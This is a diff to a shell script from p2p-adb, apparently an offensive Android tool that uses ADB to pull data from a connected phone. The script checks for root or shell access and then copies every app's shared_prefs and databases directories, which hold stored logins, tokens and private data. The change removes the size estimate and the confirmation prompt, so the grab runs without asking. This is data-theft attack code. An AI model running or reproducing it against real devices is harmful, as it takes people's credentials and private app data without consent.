@@ -1,29 +1,22 @@
-#!/bin/sh
+# p2p-adb
+# https://github.com/kosborn/p2p-adb/
+# @theKos
+# kyle@kyleosborn.com
 
-sh ./isRoot.sh > /dev/null
+
+
+isRoot > /dev/null
 ISROOT=$?
 
 if [ $ISROOT -eq 2  ]; then 
+	DATAPATH="/sdcard/Android/data/*/{shared_prefs,databases}/"
 	echo 'We are user shell!'
 	echo 'Whoever, we can grab contents for /sdcard/Android/data'
-	DATAPATH="/sdcard/Android/data/*"
-	echo "Calculating size of: $DATAPATH/{shared_prefs|databases}/"
-	SIZE=$(sh ./inc/data_size.sh "$DATAPATH")
-	echo "The size of $DATAPATH is: $SIZE"
-	echo -n 'Continue? [Y/n] '
-	read REPLY
-	[[ $REPLY = [yY] ]] && sh ./inc/grab_data "$DATAPATH" || echo "Cancelling..."
+	getData "$DATAPATH"
 elif [ $ISROOT -eq 0 ]; then
-	DATAPATH="/data/data/*"
+	DATAPATH="/data/data/*/{shared_prefs,databases}/"
 	echo 'We are root...'
-	echo "Calculating size of: $DATAPATH/{shared_prefs|databases}/"
-	SIZE=$(sh ./inc/data_size.sh "$DATAPATH")
-	echo "The size of $DATAPATH is: $SIZE"
-	echo -n 'Continue? [Y/n] '
-	read REPLY
-	if [ $REPLY = [yY] ]; then
-		sh ./inc/grab_data "$DATAPATH"
-	fi
+	getData "$DATAPATH"
 else
 	echo $ISROOT
 fi
